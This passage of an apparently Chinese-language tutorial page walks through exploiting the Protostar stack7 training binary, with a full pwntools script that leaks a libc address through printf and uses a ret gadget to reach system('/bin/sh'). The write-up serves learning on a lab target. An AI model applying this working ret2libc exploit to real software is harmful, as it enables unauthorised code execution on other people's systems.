<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Sending leak payload...&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># 接收第一次的输出</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;got path &quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  <span class="c1"># 接收包含很多 A 的那一行</span>

<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># 接收空格</span>
<span class="n">leaked_gets</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Leaked gets address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_gets</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">示例输出如下：</span>
<span class="sd">└─$ python addr.py</span>
<span class="sd">[+] Starting local process &#39;/opt/protostar/bin/stack7&#39;: pid 23206</span>
<span class="sd">[*] Sending leak payload...</span>
<span class="sd">[+] Leaked gets address: 0xf7cf9670</span>
<span class="sd">[*] Stopped process &#39;/opt/protostar/bin/stack7&#39; (pid 23206)</span>
<span class="sd">&#39;&#39;&#39;</span>
</code></pre></div>
<p><strong>获取libc函数偏移地址</strong></p>
<div class="highlight"><pre><span></span><code><span class="n">常用两种方式</span><span class="err">：</span>


<span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">ldd</span><span class="w"> </span><span class="n">stack7</span>
<span class="w">        </span><span class="n">linux</span><span class="o">-</span><span class="n">gate</span><span class="p">.</span><span class="n">so</span><span class="mf">.1</span><span class="w"> </span><span class="p">(</span><span class="mh">0xf7ee8000</span><span class="p">)</span>
<span class="w">        </span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="w"> </span><span class="p">(</span><span class="mh">0xf7c86000</span><span class="p">)</span>
<span class="w">        </span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span><span class="w"> </span><span class="p">(</span><span class="mh">0xf7eea000</span><span class="p">)</span>


<span class="mi">1</span><span class="err">、</span><span class="n">readelf</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">gets</span>

<span class="mi">2</span><span class="err">、</span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">gets</span>
</code></pre></div>
<p><strong>继续计算libc基地址</strong></p>
<div class="highlight"><pre><span></span><code><span class="n">libc_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">leaked_gets</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">gets_offset</span>
<span class="n">system_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libc_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">system_offset</span>
<span class="n">binsh_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libc_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">binsh_offset</span>
</code></pre></div>
<p><strong>由于stack7中检查ret返回地址的范围是0xb0000000，比stack6中0xbf000000覆盖面更大</strong>
<strong>所以直接将返回地址覆盖为system的地址，就会导致返回地址检查被触发，输出bzzzt并退出</strong></p>
<p><strong>所以不可以直接将返回地址覆盖为system地址，而是先覆盖为.text段（不会触发检查）的一个ret地址，再跳转到system</strong>
<strong>其栈布局如下：</strong></p>
<div class="highlight"><pre><span></span><code><span class="o">+------------------+</span>
<span class="o">|</span><span class="w">   </span><span class="n">缓冲区填充</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="p">(</span><span class="sc">&#39;A&#39;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
<span class="o">+------------------+</span>
<span class="o">|</span><span class="w">   </span><span class="n">ret</span><span class="w"> </span><span class="n">gadget</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">覆盖的返回地址</span><span class="w"> </span><span class="p">(</span><span class="mh">0x08048553</span><span class="p">)</span>
<span class="o">+------------------+</span>
<span class="o">|</span><span class="w">   </span><span class="n">system</span><span class="w"> </span><span class="n">地址</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="n">执行后的返回地址</span>
<span class="o">+------------------+</span>
<span class="o">|</span><span class="w">   </span><span class="n">虚假返回地址</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">的返回地址</span><span class="w"> </span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span>
<span class="o">+------------------+</span>
<span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="n">地址</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">的第一个参数</span>
<span class="o">+------------------+</span>
</code></pre></div>
<p><strong>下面是完整的exp:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;/opt/protostar/bin/stack7&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">printf_plt</span> <span class="o">=</span> <span class="mh">0x080483e4</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x08048545</span>
<span class="n">gets_got</span> <span class="o">=</span> <span class="mh">0x0804974c</span>

<span class="c1"># 第一步：泄露 gets 地址</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span>      <span class="c1"># 返回到 printf</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>        <span class="c1"># printf 返回后回到 main</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048648</span><span class="p">)</span>       <span class="c1"># 格式字符串 &quot; %s\n&quot;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gets_got</span><span class="p">)</span>         <span class="c1"># 要泄露的 GOT 地址</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Sending leak payload...&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># 接收输出</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;got path &quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  <span class="c1"># 接收包含 A 的那一行</span>

<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># 接收空格</span>
<span class="n">leaked_gets</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Leaked gets address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_gets</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># 等待下一个输入提示</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;input path please: &quot;</span><span class="p">)</span>

<span class="c1"># 第二步：计算地址</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
<span class="n">gets_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">binsh_offset</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_gets</span> <span class="o">-</span> <span class="n">gets_offset</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_offset</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">binsh_offset</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] System address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] /bin/sh address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># 找到二进制文件中的 ret gadget</span>
<span class="c1"># 可以用这个命令查找：objdump -d stack7 | grep -A1 &quot;ret&quot;</span>
<span class="n">ret_gadget</span> <span class="o">=</span> <span class="mh">0x08048553</span>  <span class="c1"># 这是 main 函数中的 ret 指令</span>

<span class="c1"># 第三步：使用 ret gadget 进行 ret2libc</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_gadget</span><span class="p">)</span>      <span class="c1"># 先返回到 ret gadget</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>     <span class="c1"># 然后到 system</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span>      <span class="c1"># system 的假返回地址</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>      <span class="c1"># system 的参数</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Sending ret2libc payload...&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>

<span class="c1"># 获取 shell</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p><img alt="image.png" src="https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250903102336550.png" /></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
    
  </body>
</html>